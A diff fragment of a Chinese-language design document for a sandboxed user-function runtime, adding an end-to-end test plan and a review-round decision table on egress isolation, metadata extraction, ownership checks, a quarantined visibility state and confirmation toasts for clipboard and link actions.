-- Vitest + Playwright E2E（含 ownership / RBAC / host_command 白名單外注入）
+- ChatRuntime 整合（toolbar button render、host_command dispatch with two-step toast for clipboard/link）
+- Vitest + Playwright E2E（含 ownership / RBAC / host_command 白名單外注入 / quarantined visibility / clipboard.copy toast）
 - Dogfood 1-2 位 dev → 1 週後開放所有 developer
 
 ---
@@ -930,3 +1096,15 @@ CSP 收到 worker SSE chunk 後 → push 到 SSE-to-browser 之前 → 寫 audit
 | version_no 並發 | sequence / for update / advisory lock | **advisory lock per-function** |
 | Schema 抽取位置 | CSP exec user code / static AST / worker sandbox RPC | **worker `/extract-meta` RPC**（CSP 不 exec） |
 | Audit redaction 角色 | 主防線 / 兜底 | **兜底**（reframe；主防線是 egress proxy + minimal injection） |
+
+### 第三輪修法（Codex round-2 review，2026-04-28）
+
+| 決定 | 選項 | 結果 |
+|---|---|---|
+| Egress 控制機制 | env vars / host iptables / 分裂網路拓樸 | **分裂網路拓樸**（worker 在 `internal:true` 的 functions-net，egress proxy 跨兩網橋接；env 不是安全邊界） |
+| `/extract-meta` profile | 同 /exec 強度 / 更嚴 / 純 static AST | **兩階段：static AST 優先 + sandbox exec fallback (extract-meta-net 無 egress, 3s, 64MB, 不傳 valves)** |
+| Test Console vs ownership 7 步 | 共用 7 步 / 分兩條路徑 | **分兩條路徑**：chat_message 走 owner check；test_console 走 author/admin synthetic |
+| Conversation gate | 假設既有 share/handoff/clearance / 沿用實際 owner+admin only | **沿用實際 owner+admin only**（v1）；future work 標記 |
+| Disabled by admin 後 code 可見度 | 沿用 disabled / 加 quarantined 第四狀態 | **加 quarantined**：code 鎖到 author+admin；`disabled_reason` 欄位記理由 |
+| advisory lock key | hashtext / function_id 直接 | **namespaced 2-int (NS=42, function_id)** |
+| clipboard.copy / link.open browser activation | 直接執行 / 二段確認 toast | **二段確認 toast**（順便 anti-phishing） |
